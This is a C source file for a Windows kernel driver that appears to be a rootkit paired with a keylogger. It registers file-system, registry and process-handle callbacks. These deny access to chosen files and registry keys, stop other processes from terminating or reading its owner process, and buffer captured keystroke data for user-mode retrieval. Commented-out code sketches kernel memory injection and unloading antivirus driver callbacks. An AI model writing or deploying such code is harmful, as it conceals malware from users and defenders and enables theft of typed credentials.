#include "header.h"


inline ULONG ConvertHandleToProcessId(HANDLE hPid)
{
	return ((ULONG_PTR)hPid) & 0xFFFFFFFF;
}

typedef struct _KL_DATA {
	LIST_ENTRY entry;
	LPSTR lpszKeyboardData;
} KL_DATA, *PKL_DATA;
typedef struct _REGISTRY_PATHS {
	LIST_ENTRY entry;
	LPWSTR lpszRegistry;
}REGISTRY_PATHS, *PREGISTRY_PATHS;
typedef struct _FILE_PATHS {
	LIST_ENTRY entry;
	LPWSTR lpszFilePath;
}FILE_PATHS, *PFILE_PATHS;
typedef struct _DeviceConfig {
	LIST_ENTRY llRegistryList;
	LIST_ENTRY llFileList;
	LIST_ENTRY llKeyboardList;
	BOOLEAN klDriverInUse;
	BOOLEAN LoadKlDriver;
	BOOLEAN InUse;
	BOOLEAN FilePathConfigured;
	BOOLEAN RegistryConfigured;
	ULONG OwnerProcessID;
	PCHAR shit;
	struct {
		KIRQL OldIRQL;
		KSPIN_LOCK SpinLock;
	} context[1];
} DeviceConfig, *PDeviceConfig;

PDeviceConfig GetConfig(PDEVICE_OBJECT DeviceObject) {
	return (PDeviceConfig)DeviceObject->DeviceExtension;
}

PFLT_FILTER hFltFilter = NULL;

const FLT_CONTEXT_REGISTRATION Contexts[] = {
	{ FLT_CONTEXT_END }
};

CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
	{ IRP_MJ_CREATE, 0, FltCreateFilePre,  NULL },
	{ IRP_MJ_OPERATION_END }
};

CONST FLT_REGISTRATION FilterRegistration = {
	sizeof(FLT_REGISTRATION),
	FLT_REGISTRATION_VERSION,
	FLTFL_REGISTRATION_DO_NOT_SUPPORT_SERVICE_STOP,
	Contexts,
	Callbacks,
	NULL,
	FilterSetup,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

NTSTATUS FilterSetup(PCFLT_RELATED_OBJECTS FltObjects, FLT_INSTANCE_SETUP_FLAGS Flags, DEVICE_TYPE VolumeDeviceType, FLT_FILESYSTEM_TYPE VolumeFilesystemType)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(VolumeDeviceType);
	UNREFERENCED_PARAMETER(VolumeFilesystemType);
	return STATUS_SUCCESS;
}


/*
NTKERNELAPI
PVOID
PsGetProcessSectionBaseAddress(
	__in PEPROCESS Process
);

NTSTATUS NTAPI 	MmCopyVirtualMemory(
	IN PEPROCESS SourceProcess, 
	IN PVOID SourceAddress, 
	IN PEPROCESS TargetProcess, 
	OUT PVOID TargetAddress, 
	IN SIZE_T BufferSize, 
	IN KPROCESSOR_MODE PreviousMode, 
	OUT PSIZE_T ReturnSize);

NTSTATUS Inject(HANDLE ProcessId, PVOID SrcAddress, SIZE_T BufferSize, SIZE_T dwBytesWritten) {
	PEPROCESS RemoteProcess;
	PEPROCESS SourceProcess = PsGetCurrentProcess();
	NTSTATUS status = PsLookupProcessByProcessId(ProcessId, &RemoteProcess);
	if (NT_SUCCESS(status)) {
		PVOID BaseAddress = PsGetProcessSectionBaseAddress(RemoteProcess);
		status = MmCopyVirtualMemory(SourceProcess, SrcAddress, RemoteProcess, BaseAddress, BufferSize, KernelMode, &dwBytesWritten);
	}
	return status;
}


NTSTATUS DriverUnloader(PUNICODE_STRING psDriverPath){

// would unload and unregister AV driver callbacks etc.
}

NTSTATUS DriverWalked(PUNICODE_STRING *DriversSearch){


}
*/
BOOLEAN CheckFile(PUNICODE_STRING check) {
	BOOLEAN status = FALSE;
	UNREFERENCED_PARAMETER(check);
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	PLIST_ENTRY pListEntry = Config->llFileList.Flink;
	while (pListEntry != &Config->llFileList)
	{
		UNICODE_STRING ucFilePath;
		RtlZeroMemory(&ucFilePath, sizeof(UNICODE_STRING));
		LPWSTR lpszFilePath = (CONTAINING_RECORD(pListEntry, FILE_PATHS, entry)->lpszFilePath);
		RtlInitUnicodeString(&ucFilePath, lpszFilePath);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "lpszFilePath: %wZ\n", &ucFilePath);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "check lpszFilePath: %wZ\n", check);
		LONG lLen = RtlCompareUnicodeString(check, &ucFilePath, FALSE);
		if (!(lLen < 0)) {
			status = TRUE;
			break;
		}
		pListEntry = pListEntry->Flink;
	}
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	return status;
}
BOOLEAN CheckRegistry(PUNICODE_STRING check) {
	BOOLEAN status = FALSE;
	if (check != NULL) {
		UNREFERENCED_PARAMETER(check);
		DeviceConfig *Config = GetConfig(hGlobalDevice);
		KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
		PLIST_ENTRY pListEntry = Config->llRegistryList.Flink;
		while (pListEntry != &Config->llRegistryList)
		{
			UNICODE_STRING ucRegistry;
			RtlZeroMemory(&ucRegistry, sizeof(UNICODE_STRING));
			LPWSTR lpszRegistry = (CONTAINING_RECORD(pListEntry, REGISTRY_PATHS, entry)->lpszRegistry);
			RtlInitUnicodeString(&ucRegistry, lpszRegistry);
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ucRegistry: %wZ\n", &ucRegistry);
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "check: %wZ\n", check);
			LONG lLen = RtlCompareUnicodeString(check, &ucRegistry, FALSE);
			if (!(lLen < 0)) {
				status = TRUE;
				break;
			}
			pListEntry = pListEntry->Flink;
		}
		KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	}
	return status;
}
FLT_PREOP_CALLBACK_STATUS FltCreateFilePre(_Inout_ PFLT_CALLBACK_DATA Data, _In_ PCFLT_RELATED_OBJECTS FltObjects, _Flt_CompletionContext_Outptr_ PVOID *CompletionContext)
{
	UNREFERENCED_PARAMETER(CompletionContext);
	FLT_PREOP_CALLBACK_STATUS st = FLT_PREOP_SUCCESS_NO_CALLBACK;
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);

	BOOLEAN InUse = Config->InUse;
	BOOLEAN Configured = Config->FilePathConfigured;
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	PFLT_FILE_NAME_INFORMATION FFNI = NULL;
	if (InUse && Configured) {
		if (FltObjects->FileObject != NULL) {
			UINT32 CreateOptions = Data->Iopb->Parameters.Create.Options & 0x00FFFFFF;
			UNREFERENCED_PARAMETER(CreateOptions);
			NTSTATUS rv = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &FFNI);
			if (!NT_SUCCESS(rv))
			{
				Data->IoStatus.Status = STATUS_FILE_CORRUPT_ERROR;
				Data->IoStatus.Information = 0;
				return st;
			}
			if (CheckFile(&FFNI->Name)) {
				Data->IoStatus.Status = STATUS_ACCESS_DENIED;
				Data->IoStatus.Information = 0;
				//IoCompleteRequest(Data, IO_NO_INCREMENT);
			}
		FltReleaseFileNameInformation(FFNI);
		}
	}
	return st;
} 


OB_PREOP_CALLBACK_STATUS  PreOperationCallback(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation) {
	UNREFERENCED_PARAMETER(RegistrationContext);
	OB_PREOP_CALLBACK_STATUS rv = OB_PREOP_SUCCESS;
	PDeviceConfig Config = GetConfig(hGlobalDevice);
	PEPROCESS OpenedProcess = (PEPROCESS)OperationInformation->Object;
	HANDLE ProcessId = PsGetProcessId(OpenedProcess);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	BOOLEAN InUse = Config->InUse;
	ULONG ulProcessId = Config->OwnerProcessID;
	ULONG ulInputProcessId = ConvertHandleToProcessId(ProcessId);
	HANDLE hCurrentProcess = PsGetCurrentProcessId();
	ULONG ulCurrentProcessId = ConvertHandleToProcessId(hCurrentProcess);
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	if (InUse) {
		if ((ulProcessId == ulInputProcessId) || (ulCurrentProcessId == ulInputProcessId)) {
			if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
			{
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_CREATE_PROCESS) == PROCESS_CREATE_PROCESS) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_CREATE_PROCESS;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess &  PROCESS_CREATE_THREAD) == PROCESS_CREATE_THREAD) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_CREATE_THREAD;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess &  PROCESS_DUP_HANDLE) == PROCESS_DUP_HANDLE) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_DUP_HANDLE;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess &  PROCESS_SET_QUOTA) == PROCESS_SET_QUOTA) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_SET_QUOTA;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess &  PROCESS_SET_INFORMATION) == PROCESS_SET_INFORMATION) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_SET_INFORMATION;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess &  PROCESS_SUSPEND_RESUME) == PROCESS_SUSPEND_RESUME) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_SUSPEND_RESUME;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_TERMINATE) == PROCESS_TERMINATE) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_TERMINATE;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_VM_OPERATION) == PROCESS_VM_OPERATION)
				{
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess &~ PROCESS_VM_READ) == PROCESS_VM_READ)
				{
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_VM_READ;
				}
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_VM_WRITE) == PROCESS_VM_WRITE)
				{
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=~ PROCESS_VM_WRITE;
				}
			}
		}
	}
	return rv;
}
VOID PobPostOperationCallback(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION OperationInformation)
{
	UNREFERENCED_PARAMETER(RegistrationContext);
	UNREFERENCED_PARAMETER(OperationInformation);
}
VOID PcreateThreadNotifyRoutine(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
	
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ThreadId);
	UNREFERENCED_PARAMETER(Create);

}
NTSTATUS GetRegistryCompleteName(PUNICODE_STRING pRegistryPath, PVOID pRegistryObject) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ULONG returnedLength = 0;
	POBJECT_NAME_INFORMATION pObjectName = NULL;
	UNREFERENCED_PARAMETER(pRegistryPath);
	status = ObQueryNameString(pRegistryObject, (POBJECT_NAME_INFORMATION)pObjectName, 0, &returnedLength);
	if (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		pObjectName = ExAllocatePoolWithTag(NonPagedPool, returnedLength, TAG);
		if (pObjectName != NULL) {
			status = ObQueryNameString(pRegistryObject, (POBJECT_NAME_INFORMATION)pObjectName, returnedLength, &returnedLength);
			if (NT_SUCCESS(status))
			{
				RtlInitUnicodeString(pRegistryPath, pObjectName->Name.Buffer);
			}
			ExFreePoolWithTag(pObjectName, TAG);
		}
	}
	return status;
}
NTSTATUS PreOpenKey(PVOID context, PREG_OPEN_KEY_INFORMATION info)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNREFERENCED_PARAMETER(context);
	UNREFERENCED_PARAMETER(info);
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	BOOLEAN Configured = Config->RegistryConfigured;
	BOOLEAN InUse = Config->InUse;
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	if (InUse && Configured) {
		if (CheckRegistry(info->CompleteName)) {
			status = STATUS_ACCESS_DENIED;
		}

	}
	return status;
}
NTSTATUS PreDeleteValue(PVOID context, PREG_DELETE_VALUE_KEY_INFORMATION info)
{
	UNREFERENCED_PARAMETER(context);
	UNREFERENCED_PARAMETER(info);

	NTSTATUS status = STATUS_SUCCESS;
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	BOOLEAN Configured = Config->RegistryConfigured;
	BOOLEAN InUse = Config->InUse;
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	if (InUse && Configured) {

		UNICODE_STRING CompleteName;
		status = GetRegistryCompleteName(&CompleteName, info->Object);
		if (NT_SUCCESS(status)) {
			if (CheckRegistry(&CompleteName)) {
				status = STATUS_ACCESS_DENIED;
			}
		}
	}
	return status;
}
NTSTATUS PreSetValue(PVOID context, PREG_SET_VALUE_KEY_INFORMATION info)
{
	UNREFERENCED_PARAMETER(context);
	UNREFERENCED_PARAMETER(info);

	NTSTATUS status = STATUS_SUCCESS;
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	BOOLEAN Configured = Config->RegistryConfigured;
	BOOLEAN InUse = Config->InUse;
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	if (InUse && Configured) {
		UNICODE_STRING CompleteName;
		status = GetRegistryCompleteName(&CompleteName, info->Object);
		if (NT_SUCCESS(status)) {
			if (CheckRegistry(&CompleteName)) {
				status = STATUS_ACCESS_DENIED;
			}
		}
	}
	return status;
}
/*
7:29:55.173 PM	1	KERNELBASE.dll	NtOpenKeyEx ( 0x0115f080, KEY_ALL_ACCESS, 0x0115ef2c, 0 )	STATUS_ACCESS_DENIED	0xc0000022 = {Access Denied} A process has requested access to an object, but has not been granted those access rights. 	0.0000654

*/
NTSTATUS PreQueryMultipleValue(PVOID context, PREG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION info)
{
	UNREFERENCED_PARAMETER(context);
	UNREFERENCED_PARAMETER(info);

	NTSTATUS status = STATUS_SUCCESS;
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	BOOLEAN Configured = Config->RegistryConfigured;
	BOOLEAN InUse = Config->InUse;
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	if (InUse && Configured) {
		UNICODE_STRING CompleteName;
		status = GetRegistryCompleteName(&CompleteName, info->Object);
		if (NT_SUCCESS(status)) {
			if (CheckRegistry(&CompleteName)) {
				status = STATUS_ACCESS_DENIED;
			}
		}
	}
	return status;
}
NTSTATUS PreQueryValue(PVOID context, PREG_QUERY_VALUE_KEY_INFORMATION  info)
{
	UNREFERENCED_PARAMETER(context);
	UNREFERENCED_PARAMETER(info);

	NTSTATUS status = STATUS_SUCCESS;
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	BOOLEAN Configured = Config->RegistryConfigured;
	BOOLEAN InUse = Config->InUse;
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	if (InUse && Configured) {
		UNICODE_STRING CompleteName;
		status = GetRegistryCompleteName(&CompleteName, info->Object);
		if (NT_SUCCESS(status)) {
			if (CheckRegistry(&CompleteName)) {
				status = STATUS_ACCESS_DENIED;
			}
		}
	}
	return status;
}
NTSTATUS PreCreateKey(PVOID context, PREG_PRE_CREATE_KEY_INFORMATION info)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNREFERENCED_PARAMETER(context);
	UNREFERENCED_PARAMETER(info);
	DeviceConfig *Config = GetConfig(hGlobalDevice);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	BOOLEAN Configured = Config->RegistryConfigured;
	BOOLEAN InUse = Config->InUse;
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	if (InUse && Configured) {
		if (CheckRegistry(info->CompleteName)) {
			status = STATUS_ACCESS_DENIED;
		}
	}
	
	return status;
}

NTSTATUS RegistryCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2) {

		REG_NOTIFY_CLASS Value = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;
		NTSTATUS rv = STATUS_ACCESS_DENIED;
		switch (Value) {
			
		case RegNtPreCreateKey:
		case RegNtPreCreateKeyEx:
		case RegNtPreOpenKey:
			rv = PreCreateKey(CallbackContext, (PREG_PRE_CREATE_KEY_INFORMATION)Argument2);
			break;

		case RegNtPreOpenKeyEx:
			rv = PreOpenKey(CallbackContext, (PREG_OPEN_KEY_INFORMATION)Argument2);
			break;
			
		case RegNtSetValueKey:
			rv = PreSetValue(CallbackContext, (PREG_SET_VALUE_KEY_INFORMATION)Argument2);
			break;
			
		case RegNtPreDeleteValueKey:
			rv = PreDeleteValue(CallbackContext, (PREG_DELETE_VALUE_KEY_INFORMATION)Argument2);
			break;
		case RegNtPreQueryValueKey:
			rv = PreQueryValue(CallbackContext, (PREG_QUERY_VALUE_KEY_INFORMATION)Argument2);
			break;
		
		case RegNtPreQueryMultipleValueKey:
			rv = PreQueryMultipleValue(CallbackContext, (PREG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION)Argument2);
			break;
			
		default: {
			rv = STATUS_SUCCESS;
			break;
		}

		}
	return rv;
}
VOID Unload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Unload\n");
	UNICODE_STRING usDosObject;
	RtlInitUnicodeString(&usDosObject, DOS_DEVICE_NAME);
	DeviceConfig *Config = GetConfig(DriverObject->DeviceObject);

	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	PLIST_ENTRY pListEntry = Config->llRegistryList.Flink;
	while (pListEntry != &Config->llRegistryList)
	{
		ExFreePoolWithTag(CONTAINING_RECORD(pListEntry, REGISTRY_PATHS, entry)->lpszRegistry, 'CrAp');
		pListEntry = pListEntry->Flink;
	}
	while (pListEntry != &Config->llFileList)
	{
		ExFreePoolWithTag(CONTAINING_RECORD(pListEntry, FILE_PATHS, entry)->lpszFilePath, 'CrAp');
		pListEntry = pListEntry->Flink;
	}
	FltUnregisterFilter(hFltFilter);
	CmUnRegisterCallback(liRegistry);
	ObUnRegisterCallbacks(hCallback);
//	PsRemoveCreateThreadNotifyRoutine(PcreateThreadNotifyRoutine);
	IoDeleteSymbolicLink(&usDosObject);
	IoDeleteDevice(DriverObject->DeviceObject);

	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	//PsSetCreateProcessNotifyRoutineEx(ProcessRoutine, TRUE);
	//PsRemoveLoadImageNotifyRoutine(LoadImageNotifyRoutine);

}
// what was being read? cant say ;)
NTSTATUS IRP_Read(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	NTSTATUS rv = STATUS_SUCCESS;
	DeviceConfig *Config = GetConfig(pDeviceObject);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	PIO_STACK_LOCATION pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IRP_Read\n shit: %s\n", Config->shit);
	DWORD shitsize = 0;
	if (Config->shit) {
		shitsize = strlen(Config->shit) + 1;
		if (pIoStackLocation) {
			PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
			ULONG ulBuffer = pIoStackLocation->Parameters.Read.Length;
			if (pBuffer) {
				if (shitsize > ulBuffer) {
					RtlCopyMemory(pBuffer, Config->shit, ulBuffer);
					RtlMoveMemory(Config->shit, ((PCHAR)Config->shit + ulBuffer), ulBuffer);
				}
				else {
					RtlCopyMemory(pBuffer, Config->shit, shitsize);
				}
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "RtlCopyMemory irpmjread\n");

			}
		}
	}
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	pIrp->IoStatus.Information = shitsize;
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return rv;
}

NTSTATUS IRP_Write(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IrpMjWrite() called\n");
	NTSTATUS rv = STATUS_SUCCESS;
	ULONG_PTR dwBytesWritten = 0;
	DeviceConfig *Config = GetConfig(pDeviceObject);
	if (Config) {
		PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(pIrp);
		if (pIoStackIrp) {

			PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
			ULONG ulBufferSize = pIoStackIrp->Parameters.Write.Length;
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "pIoStackIrp\n");
			if ((pBuffer != NULL) && (ulBufferSize != 0)) {
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "pBuffer %p\n", pBuffer);
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ulBufferSize %u pBuffer %s\n", ulBufferSize, pBuffer);
				KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
				if (Config->InUse) {
					DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "NETWORK_DATA\n");
					KL_DATA *Kl_Data = ExAllocatePoolWithTag(NonPagedPool, sizeof(KL_DATA), 'CrAp');
					RtlZeroMemory(Kl_Data, sizeof(KL_DATA));
					Kl_Data->lpszKeyboardData = ExAllocatePoolWithTag(NonPagedPool, ulBufferSize, 'CrAp');
					RtlCopyMemory(Kl_Data->lpszKeyboardData, pBuffer, ulBufferSize);
					InsertTailList(&Config->llKeyboardList, &Kl_Data->entry);
					PLIST_ENTRY pListEntry = Config->llKeyboardList.Flink;
					while (pListEntry != &Config->llKeyboardList)
					{
						DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KL_DATA: %s\n", (CONTAINING_RECORD(pListEntry, KL_DATA, entry)->lpszKeyboardData));
						pListEntry = pListEntry->Flink;
					}
					rv = STATUS_SUCCESS;
				}
				KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
			}
		}
	}

	pIrp->IoStatus.Information = dwBytesWritten;
	pIrp->IoStatus.Status = STATUS_SUCCESS;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return rv;
}
NTSTATUS LoadDriver(UNICODE_STRING usDriverPath) {
	//HANDLE hFile = NULL
	UNREFERENCED_PARAMETER(usDriverPath);
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	//OBJECT_ATTRIBUTES ObjAttr;
	//IO_STATUS_BLOCK iosb;
//	InitializeObjectAttributes(&ObjAttr, sizeof(OBJECT_ATTRIBUTES), NULL, NULL, OBJ_KERNEL_HANDLE);
	//status = FltCreateFile(hFltFilter, NULL, &hFile, GENERIC_READ, &ObjAttr, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_DIRECTORY_FILE, NULL, , IO_IGNORE_SHARE_ACCESS_CHECK);
	if (!NT_SUCCESS(status)) {

	}
	//FltReadFile()
//cleanup:
	return status;
}
NTSTATUS IRP_DeviceControl(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP Irp) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IRP_DeviceControl calledzzzzzs\n");
	PIO_STACK_LOCATION pIoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	// process id of requestor for I/O
	//ULONG ulProcessId = IoGetRequestorProcessId(Irp);
	if (pIoStackLocation) {
		ULONG ulControlCode = pIoStackLocation->Parameters.DeviceIoControl.IoControlCode;
		LPWSTR pBuffer = Irp->AssociatedIrp.SystemBuffer;
		ULONG ulBuffer = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IRP_DeviceControl called\n");
		// check if ulProcessId is Executive == kernel mode
		switch (ulControlCode) {

			case LOAD_KL_DRIVER:
			{
				DeviceConfig *Config = GetConfig(pDeviceObject);
				KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
				if (pBuffer && (ulBuffer != 0)) {
					LPWSTR lpszFilePath = ExAllocatePoolWithTag(NonPagedPool, ulBuffer, TAG);
					//if(lpszFilePath)
					// removed code to manual map the driver lol
					RtlCopyMemory(lpszFilePath, pBuffer, ulBuffer);
					ExFreePoolWithTag(lpszFilePath, TAG);
					Config->LoadKlDriver = TRUE;

				}

				KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
			}

			break;
			case REGISTRY_INSERT:
			{			
				DeviceConfig *Config = GetConfig(pDeviceObject);
				KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
				if (pBuffer && (ulBuffer != 0)) {
					if (Config->InUse) {
						Config->RegistryConfigured = TRUE;
						REGISTRY_PATHS *RegistryPaths = ExAllocatePoolWithTag(NonPagedPool, sizeof(REGISTRY_PATHS), 'CrAp');
						RtlZeroMemory(RegistryPaths, sizeof(REGISTRY_PATHS));
						RegistryPaths->lpszRegistry = ExAllocatePoolWithTag(NonPagedPool, ulBuffer, 'CrAp');
						RtlCopyMemory(RegistryPaths->lpszRegistry, pBuffer, ulBuffer);
						InsertTailList(&Config->llRegistryList, &RegistryPaths->entry);
						PLIST_ENTRY pListEntry = Config->llRegistryList.Flink;
						while (pListEntry != &Config->llRegistryList)
						{
							DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "RegistryPaths: %ws\n", (CONTAINING_RECORD(pListEntry, REGISTRY_PATHS, entry)->lpszRegistry));
							pListEntry = pListEntry->Flink;
						}
						status = STATUS_SUCCESS;
					}
				}
				KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
			}
			break;
			case FILE_INSERT:
			{
				DeviceConfig *Config = GetConfig(pDeviceObject);
				KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
				if (pBuffer && (ulBuffer != 0)) {
					if (Config->InUse) {
						Config->FilePathConfigured = TRUE;
						FILE_PATHS *FilePaths = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_PATHS), 'CrAp');
						RtlZeroMemory(FilePaths, sizeof(FILE_PATHS));
						FilePaths->lpszFilePath = ExAllocatePoolWithTag(NonPagedPool, ulBuffer, 'CrAp');
						RtlCopyMemory(FilePaths->lpszFilePath, pBuffer, ulBuffer);
						InsertTailList(&Config->llFileList, &FilePaths->entry);
						PLIST_ENTRY pListEntry = Config->llFileList.Flink;
						while (pListEntry != &Config->llFileList)
						{
							DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "FilePath: %ws\n", (CONTAINING_RECORD(pListEntry, FILE_PATHS, entry)->lpszFilePath));
							pListEntry = pListEntry->Flink;
						}
						status = STATUS_SUCCESS;
					}
				}
				KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
			}
			break;
		}
	}
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
NTSTATUS IRP_Create(PDEVICE_OBJECT pDeviceObject, PIRP Irp) {
	BOOLEAN Opened = FALSE;
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	DeviceConfig *Config = GetConfig(pDeviceObject);
	KeAcquireSpinLock(&Config->context->SpinLock, &Config->context->OldIRQL);
	ULONG RequestorID = IoGetRequestorProcessId(Irp);
	if (!Config->InUse) {
		Config->InUse = TRUE;
		Config->OwnerProcessID = RequestorID;
		Opened = TRUE;
	}
	else if (!Config->klDriverInUse && Config->LoadKlDriver) {
		Config->klDriverInUse = TRUE;
		Opened = TRUE;
	}
	KeReleaseSpinLock(&Config->context->SpinLock, Config->context->OldIRQL);
	st = Opened ? STATUS_SUCCESS : STATUS_SHARING_VIOLATION;
	Irp->IoStatus.Status = st;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return st;
}
NTSTATUS IRP_Unknown(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pIrp);
	return STATUS_NOT_SUPPORTED;
}
